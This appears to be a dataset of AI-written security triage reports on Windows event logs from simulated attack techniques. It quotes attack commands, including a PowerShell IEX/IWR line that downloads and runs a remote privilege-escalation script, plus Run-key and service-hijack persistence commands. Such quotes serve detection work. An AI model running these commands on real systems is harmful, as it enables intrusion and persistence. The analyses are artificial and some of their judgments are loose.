- Isolating the affected host (`Server002`) from the network to prevent further potential damage.
- Performing a comprehensive threat scan on the system.
- Investigating any recent changes to user accounts and permissions.
- Reviewing the surrounding network for indications of lateral movement or other compromised systems.
- Initiating incident response protocols to restore system integrity.

Further detailed investigation and possibly forensic analysis would be necessary to fully understand the scope and root cause of the compromise."
Domain Password Policy Check: No Number in Password,"The logs provided show multiple activities that need attention:

1. **System Log**: These logs primarily show Windows Update activities with Event ID 44. These show various system libraries and components being updated, and there's nothing unusual here that signifies any threat or risk. All updates are from Microsoft, which generally indicates benign activities.

2. **Windows PowerShell Log**: The PowerShell logs capture a script executed which deals with checking and changing the user's password. It involves reading a stored credential file and changing the password if it matches a certain string. The script’s behavior of managing passwords through PowerShell is typically a sensitive operation and could be risky if unauthorized. The key risk here is the presence of hard-coded password strings and reliance on a local file for credential storage, which is considered a security risk due to potential exposure to unauthorized users.

3. **Sysmon Log**: A significant number of process creation events (Event ID 1 and 5) are seen, which include PowerShell and other command-line utilities like `whoami.exe` and `hostname.exe`. The extensive use of `powershell.exe` with a complex command script, coupled with Sysmon logs showing frequent direct invocation of `wevtutil.exe` (used to query or clear event logs) and `conhost.exe` (a frequent parent process for command-line operations), could be indicative of suspicious activity.

4. **Additional Logs**:
   - **Application Log**: Only a single entry related to the Software Protection Platform, which appears as a routine timestamp log. 
   - **Security Log**: No entries recorded.

### Assessment:

- **Suspicious Activity**: The use of PowerShell to manage credentials with possible hard-coded passwords raises a security flag, as PowerShell can be used for both administrative and malicious purposes. Additionally, the repeated execution of event log utilities like `wevtutil.exe` might indicate an attempt to tamper with or review event logs.
  
- **Potential Threats**: The activities captured suggest potential credential mishandling or risk of password exposure. The lack of explicit permission context or information on user investigation makes it equally likely this could be either system administration or an example of concealed malicious operations.

### Recommendation:

- Investigate further the PowerShell scripts and logs thoroughly, and verify if such operations are part of legitimate administrative tasks or misused by unauthorized users.
- Check user privileges and recent system changes to authenticate the origin and rationale for these PowerShell tasks.
- Monitor and audit the use of such commands and utilities closely to prevent misuse, especially focusing on the handling of sensitive information like passwords.
- Implement stricter policies around PowerShell execution and harden systems against unauthorized scripts being run.

### Resolution:

- **SUSPICIOUS**: The activity merits further investigation to rule out misuse or unauthorized access."
Parent PID Spoofing - Spawn from New Process,"### Detailed Analysis

Upon examining the log entries from the Application, Windows PowerShell, and Sysmon logs, several activities stand out that warrant further investigation:

1. **PowerShell Activity:**
   - There is a consistent pattern of PowerShell logs concerning the execution of `powershell.exe` with the command: 
     ```
     Start-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'
     ```
   - This usage of PowerShell indicates the chaining of processes, where `notepad.exe` is being opened and passed as a parent process to another PowerShell command. This is unusual and can often be indicative of process injection or scripting attacks. It particularly uses `Start-ATHProcessUnderSpecificParent`, a custom or less common operation which may not typically be seen in legitimate PowerShell scripts. This could be an attempt to obfuscate or bypass certain security controls or to hide malware's execution path.

2. **Sysmon Activity:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being launched in quick succession, all by the user `SERVER002\admin_test`. Although `wevtutil.exe` is a legitimate Windows utility used for event log management, its frequent invocation could be used to clear event logs by a malicious actor attempting to cover tracks.
   - Likewise, `hostname.exe` and `whoami.exe` executions followed by `conhost.exe` raise questions. These commands provide basic system information and user context, often run as part of a reconnaissance phase in an attack.

3. **Anomalous Process Relationships:**
   - The execution of `powershell.exe` from a temporary directory with high integrity level and with `notepad.exe` as a related process complexity adds to the suspicion of malicious activity.

### Assessment

Given the observed behaviors, particularly the unusual PowerShell command activity and the repeated invocation of system utilities like `wevtutil.exe` and `conhost.exe`, the logs show signs of potentially anomalous activity that are not typical for standard user operations. Such command-line operations and scripting via PowerShell could indicate an attempt to conduct malicious actions such as persistence or defense evasion.

### Resolution

**Resolution: SUSPICIOUS**

While there is no confirmation of overtly malicious activity (e.g., known malware signatures or exfiltration attempts explicitly identified in the logs), the behavior is sufficiently uncommon and complex to be flagged as suspicious. It requires further investigation to determine the user's intent and whether this activity pertains to unauthorized actions or a standard administrative task.

### Recommended Actions

1. **Conduct a Deeper Investigation:**
   - Follow up with the user `admin_test` to verify and validate the necessity and legitimacy of these executed actions.
   - Check for additional system events or alerts outside of these logs that could provide a more comprehensive view of the system activity around the same time frame.

2. **Monitor and Conduct Forensic Analysis:**
   - Analyze the system for any additional indicators of compromise or persistence mechanisms.
   - Review the custom PowerShell commands for any malware or scripts possibly being executed.

3. **Implement PowerShell Logging and AMSI:**
   - Enable advanced PowerShell logging and Antimalware Scan Interface (AMSI) to capture detailed scripting activities.
   - Consider isolating the system for further forensic investigation until the source and intent of this activity are conclusively understood."
Winlogon Notify Key Logon Persistence - PowerShell,"Upon careful examination of the provided logs from different Windows event channels, several indicators suggest potential malicious activity:

1. **Windows PowerShell Log:**
   - The logs indicate PowerShell activity attempting to modify the Windows registry, particularly changes in the HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\ registry path. This is used to configure callback functions for events such as logon, which can be potentially exploited by malware for persistence.
   - The PowerShell command sets properties related to a DLL located in the temp directory (`C:\Windows\Temp\fileNotificationPackage.dll`). The DLL is registered to execute during the logon process with impersonation settings. This behavior is indicative of an attempt to establish persistence through a logon notifier that could execute malicious code.

2. **Security Log:**
   - The logs indicate a SYSTEM TIME change by a high privilege service process (svchost.exe). Although time adjustments in isolation may not be suspicious, they can sometimes be associated with attempts to manipulate logs or timestamps to hide the traces of nefarious activities.

3. **Sysmon Log:**
   - Numerous instances of `wevtutil.exe` and `conhost.exe` are executed by the user `admin_test`. While these aren't inherently malicious processes, abuse of `wevtutil` can be utilized in log-clearing attacks.
   - The Sysmon logs correlate with PowerShell activity that indicates potential use of PowerShell for unauthorized changes to system configuration and registry paths.

4. **System and Application Logs:**
   - The system logs reveal routine events and time adjustments without any direct indication of unauthorized operations besides that reflected in the security logs.

Based on the analysis, the activity described, particularly involving PowerShell commands that aim to establish persistence via registry and DLL replacements, and multiple unexplained executable launches, align with tactics observed in malware behaviors aimed at maintaining long-term access to a compromised host. Consequently, these indicators suggest with high confidence that these logs reflect malicious actions.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- Immediately isolate the affected host (`Server002`) from the network to prevent further propagation of any potential malware.
- Conduct a full malware scan and memory analysis to extract and analyze the DLL (`fileNotificationPackage.dll`) used.
- Review user permissions and investigate how the `admin_test` account was utilized for these activities. Reinforce security policies and ensure thorough audits of admin-level account activity.
- Conduct a comprehensive audit of PowerShell usage within the environment to identify any further misuse or policy adjustments. Implement PowerShell script block logging and transcription logging to enhance monitoring.
- Engage incident response for deeper forensic investigation and initiate update and patching cycles to close potential vulnerabilities."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"Based on the logs provided, there are several activities that are highly suspicious and indicative of potential malicious actions:

1. **PowerShell Execution:**
   - A PowerShell script executed on `2024-10-24 11:14:25.7983152`, which includes actions such as importing the `MSOnline` and `AzureAD` modules, creating credentials, and modifying Azure AD user roles. This script resets a user's password and elevates privileges in Azure AD, actions that could disrupt user accounts or unauthorized access to management roles.
   - The execution of PowerShell was performed by the user `SERVER002\\admin_test`, which might imply unauthorized use or a compromised admin account.

2. **Process Execution:**
   - Multiple instances of Windows utilities being executed (`powershell.exe`, `whoami.exe`, `setup.exe`, `wevtutil.exe`, `hostname.exe`), especially those aside from typical uses (like collecting user information or querying Windows logs).
   - The execution of `CompatTelRunner.exe`, which is typically harmless, but multiple user enumerations involving system accounts suggest possible reconnaissance activities. This, combined with the usage of wevtutil (a utility for querying event logs), could indicate a potential attempt to cover tracks or gather more information.

3. **Privilege Escalation and Role Modification:**
   - The PowerShell script contained actions to add a user to the ""Company Administrator"" and ""Global Reader"" roles in Azure Active Directory, which are highly sensitive and generally require administrative oversight.
   - Elevation of privileges without proper monitoring can pose significant business risks and regulatory compliance concerns.

4. **General Observations and Patterns:**
   - The timestamps reveal that these activities occurred in a short span of time, suggesting potential automation or script execution rather than manual, legitimate administrative actions.
   - The system integrity level at `High` for these operations also poses concerns, as elevated privileges were utilized.

**Assessment of the Situation:**
The logs reveal several potential indicators of compromise. The use of unauthorized or automated scripts to modify Azure AD roles, the enumeration of accounts, and the execution of utilities that can query and manipulate the system strongly suggest targeted activity that could lead to a security breach.

**Threats or Risks Identified:**
- Unauthorized access to sensitive accounts and potential data exfiltration or manipulation.
- Compromise of administrator credential (`SERVER002\\admin_test`).
- Unauthorized modification of important roles in Azure AD that facilitate lateral movement or the establishment of persistence.

**Guidance on How to Proceed:**
1. Immediately restrict access or disable the account `SERVER002\\admin_test` to prevent further unauthorized activities.
2. Conduct a thorough audit of Azure AD changes for any unwarranted role assignments or unusual user activity post this logging period.
3. Verify the integrity of systems accessed by `SERVER002\\admin_test` and monitor them for further suspicious activities.
4. Revoke sessions or access tokens for potentially compromised accounts and reset credentials.
5. Enhance alerting and monitoring on roles and accounts, especially focusing on cloud environments to catch similar actions in the future.
6. Incident response should initiate to contain, preserve relevant evidence, and begin an investigation into potential data breaches or further access attempts.

**Resolution:** MALICIOUS. The actions captured in these logs indicate a probable security compromise with malicious intent executed via scripted or automated means."
Modify Service to Run Arbitrary Binary (Powershell),"Upon reviewing the provided logs, the following analysis details suspicious activity detected within the logs, leading to the conclusion of potential malicious activity:

### Detailed Analysis

1. **Windows PowerShell Log:**
   - A script was executed using PowerShell that involves stopping the ""fax"" service and changing its binary path to Notepad.exe. After this, the service is restarted.
   - **Command:**
     ```powershell
     Stop-Service -Name ""fax"" -force -erroraction silentlycontinue | Out-Null
     set-servicebinarypath -name ""fax"" -path ""$env:windir\\system32\\notepad.exe""
     start-service -Name ""fax"" -erroraction silentlycontinue | out-null
     ```
   - **Assessment:** This behavior is highly suspicious and indicative of a technique known as ""service binary path hijacking"" or ""service hijacking."" It suggests an attempt to replace a legitimate service's executable with a benign executable such as Notepad, potentially to avoid detection by less sophisticated monitoring systems.

2. **Security Log:**
   - Events associated with standard time changes and the process svchost.exe being executed by the LOCAL SERVICE are expected behaviors and show no immediate signs of malicious activity.
   - **Assessment:** No suspicious activity in the context provided.

3. **Application Log:**
   - Events related to Microsoft Fax do not provide significant insight, as they align with the PowerShell activities but do not provide clear evidence of malicious exploitations by themselves.
   - **Assessment:** May correlate with suspicious PowerShell activities.

4. **System Log:**
   - Primarily logs standard system operations such as time service activity and kernel changes without indicating malicious intent.
   - **Assessment:** Benign.

5. **Sysmon Log:**
   - Execution of PowerShell and other utilities (e.g., wevtutil, conhost) under the user 'admin_test' with high integrity level. This behavior comes shortly before or after the suspicious PowerShell activity identified above.
   - **Assessment:** The function of these processes is not inherently malicious, but given their context (especially the PowerShell command), they contribute to the suspicion around the user's activities on this host.

### Conclusion
The investigation identifies a clear instance of service manipulation using PowerShell to change the binary path of a legitimate service (""fax"") to a harmless executable (""notepad.exe""). The behavior strongly indicates malicious intent due to its characteristic similarity to a known attack vector.

**Resolution: MALICIOUS**

### Guidance
- **Immediate Actions:**
  - Quarantine or isolate the affected host to prevent further potential damage or lateral movement.
  - Conduct a full malware scan and investigate for other potential threats on the host.
  - Review user accounts and permissions, especially the user ""admin_test"" involved in this activity.

- **Further Recommendations:**
  - Implement monitoring and alerting for similar PowerShell activities.
  - Review Group Policy settings to disable or restrict the modification of service binary paths.
  - Conduct security awareness training for users, emphasizing the importance of secure handling of privileges and monitoring for unusual service configurations."
Import XML Schedule Task with Hidden Attribute,"After reviewing the provided event logs, several activities stand out, particularly the use of PowerShell and process executions which could potentially point toward suspicious behavior. Here's an analysis of these logs:

### Suspicious or Anomalous Behavior:
1. **PowerShell Usage:**
   - The PowerShell logs indicate execution of a command that reads from a file and then attempts to register a scheduled task using `Invoke-CimMethod` and `RegisterByXml`. This activity involves interaction with the Windows Task Scheduler, which can be used for persistence—an indicator worth looking into for potential malicious activity.
   - The execution of a file located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\data_05_SCTASK_HIDDEN_ATTRIB.xml`, and registering tasks by XML with `Force = $true`, is another red flag. Such directory paths and forced registrations are often used in evasion techniques.

2. **Sysmon Logs:**
   - Multiple processes are being executed by the user `SERVER002\\admin_test`. These include PowerShell, conhost.exe, wevtutil.exe, hostname.exe, and whoami.exe. Of particular interest are:
     - **wevtutil.exe:** This can be used for manipulating Windows Event Logs, which attackers commonly do to cover their tracks.
     - **powershell.exe:** Executed alongside actions like scheduled task registration and reads from temporary files, suggesting potential malicious scripting.
     - **whoami.exe:** While benign by itself, the context of its invocation alongside other unusual activities could imply information gathering for further use.

3. **Privilege/Elevation:**
   - The logs show processes running with high integrity level, indicating that they have administrative-level privileges. Actions performed with such privileges could be potentially damaging if misused.

### Assessment:
- The activities involving PowerShell, especially with its execution of scripts originating from potentially obfuscated or transient file locations, combined with task scheduling, suggest preparations for persistence or automated recurring tasks which are traits often associated with malicious activities.
- Use of system utilities like `wevtutil.exe` and `whoami.exe` in this context suggests the potential for logs manipulation or information gathering for subsequent stages of an attack.

### Threats or Risks Identified:
- **Potential Persistence Mechanism:** Through the registration of potentially hidden scheduled tasks using PowerShell.
- **Privilege Abuse or Evasion:** Through high integrity level processes.
- **Use of Legitimate Utilities in a Malicious Context:** via PowerShell scripts and system utilities that are potentially leveraged to execute or conceal malicious activities.

### Guidance on How to Proceed:
- **Investigate Further:**
  - Analyze the specific PowerShell scripts used, and identify the contents of the `data_05_SCTASK_HIDDEN_ATTRIB.xml` file.
  - Check scheduled tasks in the system to validate if any unauthorized or malicious tasks have been registered.
  - Verify the legitimacy of actions on `wevtutil.exe`, `hostname.exe`, and `whoami.exe` to ascertain whether these are part of routine administrative tasks or part of a more nefarious sequence.
  - Conduct a thorough review of the `SERVER002\\admin_test` account activities for any unauthorized or suspicious commands or scripts executed.

### Conclusion:
Based on the logs, there are strong indicators of potential compromise, primarily around the use of PowerShell for task scheduling and the use of system utilities in a possibly non-standard context. Given these observations, my finding would be classified as:

**SUSPICIOUS**

Further investigation is required to assess the full scope and nature of these activities, and to determine whether malicious actions have been executed or planned."
Shortcut Modification,"In analyzing the provided Windows event logs, a few key observations and assessments can be made:

### Observations:
1. **Time Synchronization Events (Security and System Logs):**
   - There are logs indicating that system time was adjusted. Event ID 4616 in the Security log and Kernel-General events in the System log show the time change process, which involved the `svchost.exe` process running under `LOCAL SERVICE`.

2. **Sysmon Logs:**
   - **Hostname.exe, Conhost.exe, Whoami.exe:** These processes are legitimate system utilities. Their execution by `admin_test` with high integrity is not uncommon in an administrative task.
   - **Wevtutil.exe:** This utility is used to interact with Windows Event Logs. Frequent calls by `admin_test` are not inherently malicious but could warrant a closer look depending on the context. It may indicate log manipulation or review if performed without a clear purpose.
   - **Command Execution (cmd.exe and calc.exe):** The command executed through cmd.exe to create a shortcut to launch `calc.exe` from a `.url` file in the Temp directory is not typical legitimate behavior and suggests attempts to execute code indirectly. This is suspicious and commonly seen in attempts to obfuscate command executions or escalate privileges.

3. **EdgeUpdate Activity (Sysmon Log):**
   - There is frequent and recurring activity involving `MicrosoftEdgeUpdate.exe` and other associated components. While this could be routine browser updates, the high frequency and system-level execution indicate it should be verified to ensure it is legitimate and not a wrapper for malicious processes.

### Assessment:
There are several elements in the logs that suggest unusual activity:
- The command-line execution using cmd.exe to create a `.url` file that points to an executable is a technique often seen in malware or during penetration tests as an execution method that does not rely on direct execution commands.
- The appearance of `hostname.exe`, `conhost.exe`, and `whoami.exe`, while benign in many contexts, should be considered in relation to other activities. Their presence alone does not indicate malicious activity, but when correlated with suspicious cmd.exe usage, they might indicate reconnaissance or privilege escalation efforts.
- Repeated execution of `wevtutil.exe`, without clear process detail, could suggest log deletion attempts or unauthorized review, especially when done under a non-standard context.

### Resolution:
Given the potential signs of suspicious scripting (e.g., cmd.exe usages) and the context in which legitimate tools like wevtutil and MicrosoftEdgeUpdate are being executed, the recommended resolution is:

**SUSPICIOUS**

### Guidance:
- **Immediate Review:** Investigate the origin of the cmd.exe commands found and verify whether they were initiated as part of authorized activity.
- **Extended Logging:** Enable enhanced logging and monitoring for the involved processes, especially cmd.exe, whoami.exe, and MicrosoftEdgeUpdate.
- **Threat Hunting:** Conduct a threat hunting exercise focusing on these specific patterns to identify any other footprints of compromise or unauthorized administrative activities.
- **User Verification:** Confirm the activities conducted by the `admin_test` user were authorized and expected within this environment.

A persistent anomaly or further suspicious outcomes from these actions should lead to a deeper forensic investigation and may warrant escalation according to your incident response procedures."
`SeDebugPrivilege` token duplication,"Upon reviewing the provided log entries from various sources, there are several points that require attention and could indicate a potential compromise:

### Detailed Analysis:

#### Sysmon Logs:
1. **Process Execution:**
   - The execution of `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Windows\\System32\\whoami.exe` are generally benign, often used for system administration and querying user information. 
   - A notable concern arises with the execution of `powershell.exe` using a potentially malicious script. The command executed is:
     ```
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/script/script/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/script.ps1' -UseBasicParsing); script -Technique Token -Verbose}
     ```
   - This command downloads and executes a PowerShell script from an external source. The usage of `IEX (Invoke-Expression)` with `IWR (Invoke-WebRequest)` is a red flag as it can indicate the execution of a remote script, commonly seen in attacks like fileless malware and remote code execution.

#### Security Logs:
- The time change events do not appear to be linked to any unauthorized activity directly but confirm system-level changes by legitimate services. However, it coincides timewise with the suspicious PowerShell activity.

#### Application Logs:
- Reports indicate Windows Defender is on and active, but this does not guarantee all threats are caught, especially sophisticated fileless malware potentially masked by legitimate processes like PowerShell.

#### Windows PowerShell Logs:
- Further emphasizes the suspicious activity, replicating the same command seen earlier - starting processes with the PowerShell command that accesses external scripts containing potential privilege escalation techniques.

### Assessment:
- **Malicious Activity:** The repeated access and execution of a remote script via PowerShell is highly indicative of a malicious activity, specifically relating to potential privilege escalation or lateral movement within the network. This finding matches common tactics, techniques, and procedures (TTPs) used by threat actors.

### Resolution:
- **Resolution:** MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Response:**
   - Isolate `Server002` from the network to prevent any potential spread or exfiltration.
   - Perform a comprehensive memory dump and disk imaging for further forensic analysis.
   - Investigate the reach of the malicious script (e.g., potential compromise of other systems).
   
2. **Mitigation and Remediation:**
   - Review and enhance PowerShell logging practices and settings.
   - Block or monitor outgoing network traffic specifically associated with PowerShell execution of external scripts.
   - Update antivirus definitions and perform deep scans.
   
3. **Review and Monitoring:**
   - Continue to monitor related systems for unusual or suspicious activity post-remediation.
   - Evaluate user permissions and tighten security policies to limit unnecessary administrative access.

This approach should help contain the threat while identifying and rectifying any vulnerabilities that allowed it."
Process Hollowing in Go using CreateProcessW WinAPI,"Upon reviewing the provided logs, I have identified several points of interest that warrant discussion regarding potential malicious activity:

### System and Security Event Logs:
1. **Time Discrepancy:**
   - There is a time discrepancy event where the system time was changed. The initial entry shows the time changing from an ""OldTime"" of 2024-10-22 18:37:47.9388902 to a ""NewTime"" of 2024-10-22 18:37:21.6432543. This event could indicate a potential time manipulation, often performed to confuse log timelines or hide activity. However, it coincides with legitimate time synchronization activity through `time.windows.com` (via a Kernel-General event `EventID 1`), so it might be benign if it aligns with authorized system maintenance.

### Sysmon Logs:
2. **Unusual PowerShell Activity:**
   - The execution of PowerShell with a command involving `CreateProcess.exe` to run `werfault.exe` under the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\x64\\` is unusual. `werfault.exe` is a legitimate Windows process for error reporting, but PowerShell commands executing from temporary directories often raise suspicion for potential misuse or malware activity.

3. **Processes Launched by Admin_User:**
   - Several Windows system processes (e.g., `hostname.exe`, `conhost.exe`, etc.) are being executed by the user `SERVER002\\admin_test` with a high integrity level, suggesting administrative rights. While these activities can be part of normal operations, excessive launching of conhost and PowerShell for scripting, particularly from temporary directories, could signify suspicious activity, especially with administrative privileges enabled.

### Application Event Logs:
4. **Microsoft Edge Update:**
   - The logs show the legitimate update of Microsoft Edge, which appears consistent with the associated log entries for system updates. These activities are performed by a trusted NT AUTHORITY account, aligning typical software update behavior.

### Event Analysis and Conclusion:
- **BENIGN:** Most of the activity appears routine for a system undergoing updates and time synchronization, particularly given the context of a legitimate time synchronization service and Edge update process.
- **SUSPICIOUS:** The PowerShell activity, particularly involving `CreateProcess.exe` targeting `werfault.exe` from a temporary directory, is suspicious. This action, paired with elevated privileges and the other commands via PowerShell, merits further investigation to rule out any misuse.
  
### Resolution
I would categorize these findings as **SUSPICIOUS** due to the PowerShell command execution combined with elevated privileges and the temporary directory path. It’s crucial to ensure these scripts or executables were intended actions, possibly through validation of administrative logs or verifying recent administrative tasks.

### Recommended Actions
1. **Verify Administrative Actions:** Check with the user `admin_test` or responsible IT personnel to confirm these activities were authorizations.
2. **Review Scheduled Tasks and Scripts:** Audit any scripts or scheduled tasks that could be employing such command lines.
3. **Conduct Security Scans:** Run comprehensive security software scans to check for any hidden or dormant threats, particularly in directories associated with temporary file execution.
4. **Monitor Future Behavior:** Implement monitoring for future execution of PowerShell commands and track time synchronization actions more closely.

This approach will help ensure that suspicious activities are either authorized or uncovered if malicious intent exists."
Winlogon HKLM Shell Key Persistence - PowerShell,"Upon review of the provided Windows event logs across multiple categories (Application, System, Windows PowerShell, Sysmon, and Security), here are the key findings:

1. **PowerShell Events:**
   - Multiple PowerShell events indicate the modification of the registry key ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"". The modification involves changing the ""Shell"" property to include ""explorer.exe, C:\Windows\System32\cmd.exe"". This is often a method used by attackers to persistently execute a command shell upon user logon, which is a common persistence technique in malware behavior.

2. **System and Security Events:**
   - System and Security logs show changes in system time synchronizations via svchost.exe, connecting to ""time.windows.com"". This activity seems routine and does not immediately suggest malicious intent. 
   - These actions might be related to time synchronization adjustments that are normally scheduled tasks within Windows environments.

3. **Sysmon Events:**
   - Sysmon logs show several executions, including ""whoami.exe"", ""hostname.exe"", and ""MicrosoftEdgeUpdate.exe"". While use of ""whoami.exe"" can be benign, it can also be used in reconnaissance phases by an attacker within an environment.
   - The process execution of ""powershell.exe"" with modification commands involving registry alteration could indicate unauthorized attempts to create a persistence mechanism.

4. **General Observations:**
   - There is no clear evidence of privilege escalation attempts or high-severity events like security log clearance or direct privilege escalations.
   - The execution and registry changes involving PowerShell and the described modifications constitute more than benign behavior.

### Assessment:

Based on the evidence of registry modification attempts using PowerShell scripts, which often indicates attempts to alter system behaviors for persistence, and the use of command shells in the ""Shell"" registry key, the activities observed are certainly SUSPICIOUS.

### Recommendations:

Given the evidence of potentially malicious activity targeting system persistence mechanisms:

- **Further Investigation:** It's essential to validate these PowerShell-induced registry changes by:
  - Conducting a thorough review of user activities and correlating with any user authentication logs to determine if user ""admin_test"" is authentic.
  - Running endpoint detection and response (EDR) tools to check for other signs of malicious activities or malware presence.

- **Remediation Steps:**
  - Revert the registry changes made by the PowerShell commands to default settings.
  - Conduct a full antivirus and antimalware scan on Server002 to identify and remove any threats.
  - Implement stricter PowerShell execution policies and logging to monitor and alert on suspicious execution patterns moving forward.

**Resolution: SUSPICIOUS** - Logs reveal activities that require further investigation to rule out or confirm malicious intent."
Reg Key Run,"Upon reviewing the provided Windows event logs, let's break down the observations from the different logs:

1. **System Log:**
   - Several events related to time adjustments are recorded, indicating synchronization with a time source (time.windows.com). These adjustments are followed by Kernel-General events, which are typical for time changes and not inherently suspicious. 
   - The activities are executed by `svchost.exe`, a legitimate system process. 

2. **Application Log:**
   - A single event related to the Software Protection Platform Service, indicating normal periodic activities related to software licensing. This is a standard operation and does not appear suspicious.

3. **Security Log:**
   - There are time change events logged with EventID 4616, showing the system time being adjusted by a legitimate service account `LOCAL SERVICE`. Again, this links to the time synchronization seen in the System logs and is not suspicious.

4. **Sysmon Log:**
   - Multiple processes such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `reg.exe` are observed running by the user `SERVER002\admin_test`.
   - A notable entry is a `cmd.exe` execution with command line arguments involving a registry modification: 

     ```
     REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""file file"" /t REG_SZ /F /D ""C:\Path\file.exe""
     ```

   - This command adds an entry for an executable to start with the system, which could indicate persistence mechanism typically used for malware.
   - The presence of `reg.exe` for registry modification might indicate suspicious behavior, potentially indicating an attempt to maintain persistence by ensuring that the executable `file.exe` starts on user login.

Given the analysis:

- The time synchronization events and the use of legitimate system processes do not raise immediate alarms individually.
- However, the registry modification through command prompt involving adding a startup entry is anomalous and indicative of potentially unwanted or malicious behavior, which could be part of a persistence strategy by malicious software.

**Final Assessment: SUSPICIOUS**

Recommendations for further investigation include:
- Verify the origin and purpose of the `C:\Path\file.exe` executable. Ensure it is not malicious or unauthorized software.
- Examine the context around the account movements and any other activities `SERVER002\admin_test` is involved with.
- Perform a security scan on this host to identify any potential threats or installations indicated by these registry changes.
- Monitor the account actions and system changes more closely in subsequent logs."

### Sysmon Log Analysis:
1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - Several entries indicate the execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate Windows utility used to manage event logs. While its usage by an admin user does not inherently indicate suspicious activity, its repeated use in a short time span warrants further scrutiny.
   - `conhost.exe` is a legitimate console window host.
   - No unusual command-line arguments were observed.

2. **Execution of Windows Utilities:**
   - The execution of `hostname.exe` and `whoami.exe` by `SERVER002\admin_test` is observed. These tools are typically used for gathering system and user information.

3. **PowerShell Activity:**
   - An instance of `powershell.exe` was executed with a command that modifies the registry (`Set-ItemProperty`) and runs `runonce.exe` for alternate shell startup. This could potentially be an indicator of unwanted configuration change or persistence mechanism attempt.

### Application Log Analysis:
1. **Edge Update Service Entries:**
   - Log entries indicate the stopping of the Edge Update service, potentially due to service updates or administrative action.
   - No suspicious or unauthorized applications are noted.

### Security Log Analysis:
1. **Time Change Events:**
   - Log entries `EventID: 4616` indicate system time being altered, potentially by legitimate service operations or updates (`svchost.exe`). This might be irrelevant without further context but should be verified as authorized.

### PowerShell Log Analysis:
1. **Registry Modification:**
   - `powershell.exe` was used to attempt registry modifications related to `Active Setup`. The specific modification appears benign, but the context should be verified to ensure it's an authorized action.

### System Log Analysis:
1. **Time Service Activity:**
   - Normal ntp server synchronization activities are observed, which aligns with standard system time synchronization procedures.

### Summary and Resolution:
- **Suspicious Activity Detected:** The use of `powershell.exe` for registry alteration and execution of `runonce.exe` could be a potential attempt at persistence which should be reviewed further.
- **Frequency of `wevtutil.exe` Usage:** Although likely benign due to administrative context, further investigation is warranted to ensure activity aligns with authorized changes.

**Final Resolution: SUSPICIOUS**
- The activity, particularly involving PowerShell and registry changes, is considered suspicious and warrants further investigation to rule out unauthorized persistence mechanisms or exploits.
- **Recommended Actions:**
  - Verify with system administrators about recent manual changes or scripted processes.

  - If not authorized, consider isolating the involved system and further analysis to confirm or dismiss potential compromise."
Authentication Package,"**Analysis of Windows Event Logs:**

The logs provided demonstrate a mix of regular system operations and some potentially suspicious activity. Below is the breakdown of each source of logs and the evidence indicating malicious activities:

1. **System Logs:**
   - These logs primarily show regular activities such as time synchronization adjustments by `svchost.exe`, which is a legitimate Windows process. The activities noted here do not provide enough evidence of malicious behavior on their own.

2. **Sysmon Logs:**
   - A notable and suspicious entry is the execution of `powershell.exe` with a command suggesting the addition of a DLL (`package.dll`) to the ""Authentication Packages"" registry value under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`. This activity is often associated with a malicious attempt to establish a backdoor or persistence mechanism.
   - Another suspicious finding is the frequent execution of `wevtutil.exe`, `conhost.exe`, and continuous Microsoft Edge Update processes, which on their own don’t denote malicious activity but could potentially be used in conjunction with malicious scripts.

3. **Security Logs:**
   - The presence of Event ID 4672 reflects special privileges being applied to `admin_test`, which includes high-level privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`. Although these can be legitimate, they could also be abused if an account is compromised.

4. **Windows PowerShell Logs:**
   - The command executed through PowerShell is doubling down the risk identified: the operation involving copying of the DLL (`package.dll`) and altering `Authentication Packages` registry value via PowerShell scripting aligns with behavior often indicative of post-exploitation activities.

5. **Application Logs:**
   - Most entries indicate standard operations. However, events concerning ""Service stopped"" in context with suspicious Sysmon actions may warrant a closer look within that time frame.

**Assessment:**

The logs contain evidence suggesting potential compromise. Specifically, the use of PowerShell to modify critical security registry settings with a custom DLL is a significant indicator of potential malicious activity.

Based on the evidence from the logs, particularly focusing on PowerShell activity, the resolution is:

- **MALICIOUS:** The identified PowerShell command and associated registry modification likely indicates an attempt to establish persistence or elevate privileges through illegitimate means.

**Guidance on How to Proceed:**

1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent potential lateral movement and further execution of unauthorized commands.

2. **In-depth Forensic Analysis:**
   - Conduct a thorough forensic analysis of the server, focusing on identifying how the DLL was introduced and exploited.
   - Examine user account activity (especially `admin_test`) to determine if credentials were compromised.

3. **Registry Monitoring and Restoration:**
   - Revert unauthorized registry changes, specifically those affecting LSA authentication packages.
   - Implement monitoring for any further unauthorized registry changes.

4. **Infrastructure-wide Assessment:**
   - Given the risk of credential theft or lateral movement, assess the organization’s broader infrastructure for further compromise.
   - Reset credentials for affected or at-risk accounts.

5. **Execution Policy and PowerShell Logging:**
   - Tighten PowerShell execution policies across the organization and enhance PowerShell logging to capture detailed scripts and command usage.

6. **Patch and Security Hardening:**
   - Ensure all systems are patched and that appropriate security configurations are enforced, minimizing the attack vectors.

Taking decisive action based on this established malicious activity can help in preventing further potential damages."
